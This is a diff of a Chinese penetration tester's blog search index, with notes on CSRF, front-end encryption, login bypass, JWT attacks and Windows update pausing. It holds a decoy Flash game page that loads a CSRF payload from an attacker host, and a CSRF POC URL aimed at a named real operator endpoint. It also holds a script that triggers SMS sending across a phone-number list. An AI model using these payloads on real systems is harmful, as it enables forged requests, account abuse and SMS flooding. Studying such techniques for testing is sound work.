class="line">###下方代码为伪装的网页，不用也可以，只要输入攻击者ip也会被定向，效果一样的</span><br><span class="line">（会被过滤成get型）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Flash Game - Play Now!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 伪装成正常网页，诱使用户访问 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: Arial, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.flash-container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">20px</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">550px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#f9f9f9</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>🎮 Exciting Flash Game! 🎮<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Click below to play the game (requires Flash Player):<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 嵌入恶意 Flash --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;flash-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">object</span> <span class="attr">width</span>=<span class="string">&quot;550&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;movie&quot;</span> <span class="attr">value</span>=<span class="string">&quot;http://attacker-ip:8000/csrf.swf&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;http://attacker-ip:8000/csrf.swf&quot;</span> <span class="attr">width</span>=<span class="string">&quot;550&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">small</span>&gt;</span>Note: If you see a blank screen, make sure Flash Player is enabled.<span class="tag">&lt;/<span class="name">small</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 额外伪装成正常内容 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-top: 30px;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>This game requires Adobe Flash Player. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Download here<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h1><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://www.0xdawn.cn/swf_json_csrf/test.swf?endpoint=https://sim.ecloud.10086.cn:8085/simauth/app/updateAppInfo&amp;reqmethod=POST&amp;ct=application/json;charset=UTF-8&amp;jsonData=&#123;%22appId%22:%22300016001555%22,%22appName%22:%220xdawn%22&#125;&amp;php_url=https://www.0xdawn.cn/swf_json_csrf/test.php</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="csrf漏洞详解网址："><a href="#csrf漏洞详解网址：" class="headerlink" title="csrf漏洞详解网址："></a>csrf漏洞详解网址：</h1><p><a href="https://xz.aliyun.com/news/7506">一次渗透测试引发的Json格式下CSRF攻击的探索-先知社区</a></p>
+<p>..&#x2F;_code&#x2F;csrf</p>
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>web-net</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>指南针-导航</title>
     <url>/2025/04/01/%E5%AF%BC%E8%88%AA/</url>
     <content><![CDATA[<h1 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h1><p>主要：<a href="https://github.com/Kr0oked/Compass">指南针项目</a></p>
@@ -752,21 +723,73 @@
       </tags>
   </entry>
   <entry>
-    <title>console常见命令</title>
-    <url>/2025/04/29/%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4/</url>
-    <content><![CDATA[<h1 id="控制台命令"><a href="#控制台命令" class="headerlink" title="控制台命令"></a>控制台命令</h1><h4 id="简单document"><a href="#简单document" class="headerlink" title="简单document"></a>简单document</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取所有匹配的 input 元素</span></span><br><span class="line"><span class="keyword">const</span> inputs = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.un-input__inner&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取第一个输入框的值</span></span><br><span class="line"><span class="keyword">const</span> firstInputValue = inputs[<span class="number">0</span>].<span class="property">value</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取第二个输入框的值</span></span><br><span class="line"><span class="keyword">const</span> secondInputValue = inputs[<span class="number">1</span>].<span class="property">value</span>; </span><br></pre></td></tr></table></figure>
-
+    <title>前端游走</title>
+    <url>/2025/03/04/%E5%89%8D%E7%AB%AF%E6%B8%B8%E8%B5%B0/</url>
+    <content><![CDATA[<h1 id="前端加密对抗"><a href="#前端加密对抗" class="headerlink" title="前端加密对抗"></a>前端加密对抗</h1><p>网址教学：<a href="https://xz.aliyun.com/news/14066">https://xz.aliyun.com/news/14066</a></p>
+<p>我主要使用的方法是其中的 <a href="https://github.com/jxhczhl/JsRpc">JsRpc</a>  +  python</p>
+<h3 id="1-找明码函数"><a href="#1-找明码函数" class="headerlink" title="[1]找明码函数"></a>[1]找明码函数</h3><p>找到其中明码所代表的变量，一般查找方式为查找关键字：<strong>encrypt</strong> ，来找到明码加密的函数</p>
+<h3 id="2-连rpc-设断点"><a href="#2-连rpc-设断点" class="headerlink" title="[2]连rpc-设断点"></a>[2]连rpc-设断点</h3><p>连接jsrpc，设置断点，设置全局变量，设置demo变量，设置demo变量的功能</p>
 <span id="more"></span>
 
-<p>绕过前端认证提交表单的方法：</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方法一</span></span><br><span class="line">如果表单有 id 或 name，可以直接提交：</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;form&#x27;</span>).<span class="title function_">submit</span>();  <span class="comment">// 直接提交，不触发前端验证</span></span><br><span class="line"></span><br><span class="line">如果不知道 form 的选择器，可以：</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();  <span class="comment">// 提交页面第一个表单</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//方法二</span></span><br><span class="line">如果输入框有 required 属性，可以移除它：</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.un-input__inner&#x27;</span>).<span class="title function_">removeAttribute</span>(<span class="string">&#x27;required&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法三：</span></span><br><span class="line">在 &lt;form&gt; 上设置 novalidate 可以禁用 <span class="title class_">HTML5</span> 表单验证：</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;form&#x27;</span>).<span class="title function_">setAttribute</span>(<span class="string">&#x27;novalidate&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法四：</span></span><br><span class="line">如果按钮有 onclick 事件阻止提交，可以覆盖它：</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button.un-button&#x27;</span>).<span class="property">onclick</span> = <span class="literal">null</span>;</span><br><span class="line">然后手动触发点击：</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button.un-button&#x27;</span>).<span class="title function_">click</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//方法五：</span></span><br><span class="line">直接构造api：</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&quot;/submit-url&quot;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">  <span class="attr">body</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;</span><br><span class="line">    <span class="attr">field1</span>: <span class="string">&quot;value1&quot;</span>,</span><br><span class="line">    <span class="attr">field2</span>: <span class="string">&quot;value2&quot;</span>,</span><br><span class="line">  &#125;),</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>连接–&gt;<a href="https://github.com/cliayn/cliayn.github.io/blob/master/image/web-js-freely/1.txt">连接函数</a>，断点自己找明文就行</p>
+<p><img src="/../image/web-js-freely/1.png" alt="该图取自先知社区"></p>
+<p>全局变量如下，例如加密函数a(t)，t是明码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.enc=a</span><br><span class="line">//如果复杂则用下面的</span><br><span class="line"></span><br><span class="line">window.enc=function()&#123;xxxxx&#125;</span><br></pre></td></tr></table></figure>
 
+<p>设置demo变量如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var demo = new Hlclient(&quot;ws://127.0.0.1:12080/ws?group=zzz&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>设置demo变量的功能：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">//</span><br><span class="line">demo.regAction(&quot;enc&quot;, function (resolve, param) &#123;</span><br><span class="line">    var res = enc(String(param));</span><br><span class="line">    resolve(res);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//这里是传多个参数</span><br><span class="line">demo.regAction(&quot;enc&quot;, function (resolve,param) &#123;</span><br><span class="line">    //这里还是param参数 param里面的key 是先这里写，但到时候传接口就必须对应的上</span><br><span class="line">    res=hlg(param[&quot;user&quot;],param[&quot;status&quot;])</span><br><span class="line">    resolve(res);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>！！！</strong>值得注意的是：</p>
+<p>​	<strong>运行js到断点处执行所有的代码和指令，例如设置全局变量一定要在断点处，否则可能会找不到明码变量</strong></p>
+<h3 id="3-跑py代码"><a href="#3-跑py代码" class="headerlink" title="[3]跑py代码"></a>[3]跑py代码</h3><p>py代码框架大概如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//例如我爆破手机号</span><br><span class="line">import json</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">file_path = &#x27;sampled_100k.txt&#x27;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    with open(file_path, &#x27;r&#x27;) as file:</span><br><span class="line">        for line in file:</span><br><span class="line">            print(line.strip())  # .strip() to remove any extra newline characters</span><br><span class="line">            phone_number = line.strip()</span><br><span class="line">            </span><br><span class="line">            url = f&quot;http://127.0.0.1:12080/go?group=zzz&amp;action=sendSms&amp;param=&#123;phone_number&#125;&quot;</span><br><span class="line">            res = requests.get(url)</span><br><span class="line">            print(res.text)</span><br><span class="line">            </span><br><span class="line">except FileNotFoundError:</span><br><span class="line">    print(f&quot;File &#123;file_path&#125; not found.&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>！！！</strong>值得注意的是：</p>
+<p>​	<strong>你定义的window.enc函数的功能决定res.text返回的是什么</strong></p>
+<h1 id="前端穿梭"><a href="#前端穿梭" class="headerlink" title="前端穿梭"></a>前端穿梭</h1><p>如果你因为进入不了后台而找不全接口，或者渗透时js老是强制跳转登录页面，这个可能能帮到你</p>
+<h3 id="1-绕过登录口"><a href="#1-绕过登录口" class="headerlink" title="[1]绕过登录口"></a>[1]绕过登录口</h3><p>提供几个方法以供参考，如果不行还是得审计js文件</p>
+<h5 id="·1-更改响应包"><a href="#·1-更改响应包" class="headerlink" title="·1.更改响应包"></a>·1.更改响应包</h5><p>更改登录接口返回的响应包，将flase改成true，或者code改成200或者0，status改成200或者0，具体数字可能需要审计js代码，看他们js监控的登录成功的响应是什么，一般情况就是200或者0</p>
+<h5 id="·2-控制台强制跳转"><a href="#·2-控制台强制跳转" class="headerlink" title="·2.控制台强制跳转"></a>·2.控制台强制跳转</h5><p>这个比较万金油，在控制台输入如下指令，如果用不了你就得看js文件—看下方注意事项</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//引号后面加要跳转的目录</span><br><span class="line">window.location.href = &quot;/mch/info_basic/&quot;;</span><br><span class="line"></span><br><span class="line">//不行可以用这个</span><br><span class="line"></span><br><span class="line">location.hash = &#x27;/user/admin&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>如果你看到闪现了一下后台的页面就代表他们是把后台页面也放到了前端了的，有两种情况</p>
+<p>1&gt;跳转后可能在控制台会报错，点击报错的js位置进行断点，然后再输入一次控制台指令，当然，你直接在url输入也一样，就可以卡到js加载的后端</p>
+<p><img src="/../image/web-js-freely/test2.jpg"></p>
+<p>2&gt;跳转后无异常，又有两种情况解决</p>
+<p>​	—你需要多找几个断点，直到找到控制台输入指令可以调试的那个断点，一直调试下一步，直到有后台页面</p>
+<p>​	—控制台输入代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">window.onbeforeunload = function() &#123;</span><br><span class="line">    return &quot;你确定要离开吗？&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//然后再输入</span><br><span class="line">location.hash = &#x27;/admin/xxxx&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>​			一般来说，就会跳转到第一种情况，当然，具体情况还得看js咋写的</p>
+<p><img src="/../image/web-js-freely/test1.jpg"></p>
+<p>跳转到后台页面后一般是不能点击里面的链接的，这个时候要跳到f12的网络功能或者打开burp拦截包，将返回”Unauthorized”或者相关的都禁用或者拦截，禁用完之后，再运行一次控制台指令就不会强制跳转了</p>
+<p><img src="/../image/web-js-freely/3.png"></p>
+<p>！！！值得注意的是：</p>
+<p>1&gt;<strong>记得提前删除网络日历，要不然太多了影响判断</strong></p>
+<blockquote>
+<blockquote>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>2&gt;<strong>一般看js文件中用的是什么强制跳转的函数，js用什么你就用什么，例如这个就要用location.hash&#x3D;”(后台目录)”</strong></p>
+</blockquote>
+</blockquote>
+</blockquote>
+</blockquote>
+</blockquote>
+<p><img src="/../image/web-js-freely/2.jpg"></p>
+<h1 id="本地更改js文件"><a href="#本地更改js文件" class="headerlink" title="本地更改js文件"></a>本地更改js文件</h1><p>1&gt;无需多言，看得懂，会改，哪基本前端就没有什么秘密了</p>
 ]]></content>
       <categories>
         <category>Cybersecurity</category>
       </categories>
       <tags>
-        <tag>console</tag>
+        <tag>web-net</tag>
+        <tag>js</tag>
+        <tag>key</tag>
       </tags>
   </entry>
   <entry>
@@ -885,6 +908,157 @@
       </tags>
   </entry>
   <entry>
+    <title>Windows注册表防更新</title>
+    <url>/2024/12/30/Windows%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%98%B2%E6%9B%B4%E6%96%B0/</url>
+    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings]</span><br><span class="line">&quot;FlightSettingsMaxPauseDays&quot;=dword:0000F423F</span><br><span class="line">&quot;PauseFeatureUpdatesStartTime&quot;=&quot;2023-08-06T08:00:00Z&quot;</span><br><span class="line">&quot;PauseFeatureUpdatesEndTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br><span class="line">&quot;PauseQualityUpdatesStartTime&quot;=&quot;2023-08-06T08:00:00Z&quot;</span><br><span class="line">&quot;PauseQualityUpdatesEndTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br><span class="line">&quot;PauseUpdatesExpiryTime&quot;=&quot;2099-01-19T03:14:07Z&quot;</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>直接去注册表如下位置添加DWORD(32位)值(D)，值自己设，进制改为10按道理也行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"> </span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings]</span><br><span class="line">&quot;FlightSettingsMaxPauseDays&quot;=dword:00002710</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+      <tags>
+        <tag>Windows update</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>主页和api</title>
+    <url>/2024/12/26/%E4%B8%BB%E9%A1%B5%E5%92%8Capi/</url>
+    <content><![CDATA[<h1 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h1><p>在工作期间所遇到的小程序和web端所用的方式如下：</p>
+<p>1、主页由其子域名显示，其他功能显示皆由该子域名指向，xxx#&#x2F;page&#x2F;xxx</p>
+<p>2、其信息由专门的api子域名来传回，有时会有sms子域名用作短信的发送</p>
+<p>3、若没有登录，部分功能的显示可以显示，但无实际信息，即，空白，json为{}</p>
+<span id="more"></span>
+
+<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>1.页面和小程序反编译爬取出的js文件或者json文件通常会有上述两个子域名的指向&#x2F;接口</p>
+<p>2.找到指向&#x2F;接口，能够查看页面的功能以及接口的作用，用作于测试接口</p>
+<p>3.通常会有登录接口用作返回token，大概率为jwt</p>
+<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>1.有些网址不登录，后台的接口，以及其他的接口无法查看，只能看到个登录接口，即后续网址接口信息需要后台返回，但不代表不存在，通常即使是一个服务器其功能和作用都会十分广泛，毕竟好的服务器很贵的。</p>
+<p>—&gt;所以可以从多方入手，例如：该子域名的其他小程序，该接口子域名是否存在被其他网址或小程序被调用的可能</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>1.web需要登录就找它对应的小程序，一般来说小程序一旦授权就会给合法jwt</p>
+<p>2.用jwt深度爬取js，就是哪里能点点哪里，都点一遍，然后把js脚本下下来，分析指向#&#x2F;xxx&#x2F;和api</p>
+<p>3.看有无越权，逻辑漏洞，版本泄露，路径泄露和框架泄露等等</p>
+<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>认真分析一个事物就会形成一条思路明显的线路，整体的框架和内容就会完整，认真很久了还没思路那就去睡觉</p>
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>api</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞库</title>
+    <url>/2024/12/26/%E6%BC%8F%E6%B4%9E%E5%BA%93/</url>
+    <content><![CDATA[<p><a href="https://wiki.wy876.cn/#/">漏洞文库</a></p>
+<p><a href="https://github.com/wy876/POC">github漏洞库</a></p>
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>poc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>自动追番网址</title>
+    <url>/2024/12/25/%E8%87%AA%E5%8A%A8%E8%BF%BD%E7%95%AA%E7%BD%91%E5%9D%80/</url>
+    <content><![CDATA[<h1 id="网址"><a href="#网址" class="headerlink" title="网址"></a>网址</h1><p><a href="https://www.autobangumi.org/">AutoBangumi官网</a> —利用rss订阅字幕组，实现自动追番，部署比较轻松，docker部署</p>
+<p><a href="https://www.qbittorrent.org/download">qbittorrent下载地址</a> —下载器，订阅后这玩意负责自动下载，我1kG的流量就这么没的</p>
+<p><a href="https://emby.media/download.html">Emby下载地址</a> —播放器，其他的也可以，具体看bangumi和服务器支不支持</p>
+<span id="more"></span>
+
+<h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p><img src="/../image/auto_anime/1.png"></p>
+<hr>
+<p><a href="https://github.com/wushuo894/ani-rss?tab=readme-ov-file">ani-rss项目地址-GitHub</a> —支持 <strong>Transmission</strong> <strong>qBittorrent</strong> <strong>Aria2</strong> 下载器</p>
+<p>ani-rss部署参考别个博客<a href="https://www.himiku.com/archives/ani-rss.html">初之音博客</a></p>
+]]></content>
+      <categories>
+        <category>anime</category>
+      </categories>
+      <tags>
+        <tag>rss</tag>
+        <tag>qBitTorrent</tag>
+        <tag>Two-dimensional</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>正则匹配脚本</title>
+    <url>/2024/12/23/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E8%84%9A%E6%9C%AC/</url>
+    <content><![CDATA[<h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><p>今天上班的时候，老是发现uuid这些长id，我要想利用又懒得一个个复制，所以搞了一个脚本扩展，因为我是新手嘛，所以这个脚本有蛮多毛病，这章专门用来介绍哪些毛病，方便以后想改了，拿出来看看好找到要改的地方，我脚本放到github了，以防自己改炸了还有备份</p>
+<span id="more"></span>
+
+<h2 id="问题点"><a href="#问题点" class="headerlink" title="问题点"></a>问题点</h2><p>1、python代码里只匹配了双引号和单引号</p>
+<p>2、直接将匹配到的内容写入文件—空格字符和回车字符</p>
+<p>3、没有检查匹配字符的过程—不能实时的查看自己的匹配过程	&#x2F;&#x2F;主要</p>
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+        <tag>jython</tag>
+        <tag>Burp Suite</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web和小程序的漏洞排查</title>
+    <url>/2024/12/20/%E7%AC%94%E8%AE%B0_js-request/</url>
+    <content><![CDATA[<p>该篇文章为记录在工作时遇到的基本问题以及对应的解决方式，以免自己把一些方法用完就忘，下次遇到又得🐔🐔</p>
+<h2 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h2><h3 id="过前端加密"><a href="#过前端加密" class="headerlink" title="过前端加密"></a>过前端加密</h3><p>​	在web端或者小程序中可能遇到请求包中的参数加密的情况，这种加密我一般用下面的两种处理方式。</p>
+<span id="more"></span>
+
+<h6 id="1、在js中找加密和解密算法"><a href="#1、在js中找加密和解密算法" class="headerlink" title="1、在js中找加密和解密算法"></a>1、在js中找加密和解密算法</h6><p>​		—如果是自定义算法你可中大奖了，你得解算法</p>
+<p>​		—&gt;适用于简单的、有框架可套的算法，例如：AES、DES、RSA-酌情考虑</p>
+<p>​		1&gt;主要是排查js代码中的加密函数和解密函数，小程序的话需要用工具调出控制台进行调试</p>
+<p>​		2&gt;排查的函数通常为encrypt、decrypt函数，简单的直接在源代码处ctrl+f找这两单词就行，复杂的需要交数据前暂停执行进行调试，可能有点抽象，给个图就好了</p>
+<p><img src="/../image/note_24_12/1_1-2.jpg" alt="1_1-2"></p>
+<p>​		3&gt;复杂的需要一步步找，一般是小程序需要调试，步骤如下：</p>
+<p>​			（1）、暂停执行</p>
+<p>​			（2）、输入框中输入数据</p>
+<p>​			（3）、点下一步，或者下一个函数</p>
+<p>​			（4）、等监视的数据突然加密了，就记下那个函数分析</p>
+<p>​			（5）、主要找加密算法是什么、iv和key，自定义算法和国密那些就用第二个方法吧</p>
+<p>​	小程序需要用工具调出，工具推荐如下：</p>
+<p>​			①、<a href="https://github.com/eeeeeeeeee-code/e0e1-wx">windows_自动化反编译</a> </p>
+<p>​			②、<a href="https://github.com/JaveleyQAQ/WeChatOpenDevTools-Python/releases/">WeChatOpenDevTools-Python</a> </p>
+<h6 id="2、在控制台中定义函数直接输入数据"><a href="#2、在控制台中定义函数直接输入数据" class="headerlink" title="2、在控制台中定义函数直接输入数据"></a>2、在控制台中定义函数直接输入数据</h6><p>​		1&gt;这个如果处理的好，在web端基本可以直接无需理会加密</p>
+<p>​			—&gt;需要比较熟练的使用python或者其他的代码，但是，熟练使用ai也行</p>
+<p>​		2&gt;有篇文章讲的很细，如下：</p>
+<p>​			—&gt;<a href="https://xz.aliyun.com/t/14629?time__1311=GqAhYK0KBKAIP05DKBOxmEr8RpQcC1aoD">保姆级教程—前端加密的对抗（附带靶场） - 先知社区</a> </p>
+<h6 id="3、other"><a href="#3、other" class="headerlink" title="3、other"></a>3、other</h6><p>​	—&gt;在应用软件中去壳逆向分析伪代码</p>
+<h3 id="jwt-api问题"><a href="#jwt-api问题" class="headerlink" title="jwt_api问题"></a>jwt_api问题</h3><p>​	我见识现在不多，有错误的地方，想起来了就回来改一下，没有想起来就错下去喽。</p>
+<p>​	jwt身份验证，一般情况不会给人伪造为空或者爆破出来密钥的机会，对我们有利的地方是通过正规途径获得一个合法的jwt后他们的接口通常不会有过多的权限管理，人话就是越权，逻辑洞可能比较多</p>
+<h6 id="1、尝试jwt绕过"><a href="#1、尝试jwt绕过" class="headerlink" title="1、尝试jwt绕过"></a>1、尝试jwt绕过</h6><h6 id="—-生产环境没成功过"><a href="#—-生产环境没成功过" class="headerlink" title="—&gt;生产环境没成功过"></a>—&gt;生产环境没成功过</h6><p>在渗透测试中，可以尝试以下几种JWT绕过方法—没有也要试试，成功就爽了</p>
+<p>​	1&gt;<strong>修改JWT令牌</strong>：通过修改JWT的Payload部分，可以尝试提升权限。例如，将用户角色从普通用户修改为管理员<a href="https://xz.aliyun.com/t/12906">1</a>。</p>
+<p>​	2&gt;<strong>利用过期令牌</strong>：有时即使JWT令牌已过期，服务器端可能仍然接受该令牌。通过修改令牌中的<em>exp</em>（过期时间）字段，可以尝试让过期令牌重新生效<a href="https://blog.csdn.net/yang1234567898/article/details/122226635">2</a>。</p>
+<p>​	3&gt;<strong>历史令牌伪造</strong>：如果能够获取到历史JWT令牌，可以尝试修改其中的<em>iat</em>（签发时间）和<em>exp</em>字段，使其看起来像是新签发的令牌<a href="https://blog.csdn.net/weixin_51559599/article/details/134860478">3</a>。</p>
+<p>​	4&gt;<strong>算法混淆</strong>：JWT头部中的<em>alg</em>字段指定了签名算法。如果服务器端没有正确验证该字段，可以尝试将其修改为<em>none</em>，绕过签名验证<a href="https://xz.aliyun.com/t/12906">1</a>。</p>
+<p>​	5&gt;<strong>密钥爆破</strong>：如果服务器使用了弱密钥，可以尝试使用密钥字典进行爆破，获取用于签名的密钥<a href="https://blog.csdn.net/yang1234567898/article/details/122226635">2</a>。</p>
+<p>​	6&gt;<strong>SQL注入绕过key</strong>：在某些情况下，如果JWT令牌中包含SQL注入漏洞，可以通过注入攻击绕过密钥验证<a href="https://blog.csdn.net/yang1234567898/article/details/122226635">2</a>。</p>
+<h6 id="2、利用jwt"><a href="#2、利用jwt" class="headerlink" title="2、利用jwt"></a>2、利用jwt</h6><h6 id="—-找api看越权"><a href="#—-找api看越权" class="headerlink" title="—&gt;找api看越权"></a>—&gt;找api看越权</h6><p>​	拿小程序来说，一般会直接给你一个jwt，这个jwt在服务器里面没有绑定任何用户，里面一般会有一个类似于openid的存在，当然有些要你注册或者登录才会响应一个jwt或者token</p>
+<p>​	1&gt;将小程序反编译出来的代码进行分析整理，可以用我上面给的自动化反编译的那个软件，主要整理出接口和网址</p>
+<p>​	2&gt;有接口就直接爆GET、POST、PUT、HEAD、TRACE等（生产环境没事别爆delete，爆成功等死）分析响应包，很明显的，一般就几种响应，要么200，要么权限不足，要么返回数据，要么说你类型错误，当然还有给你拉小黑屋的</p>
+<p>​	3&gt;有响应就分析操作；该方法主要是找api，不一定只有反编译的js里有，其本身小程序也是前端，可以尝试更改响应包跑前端的接口</p>
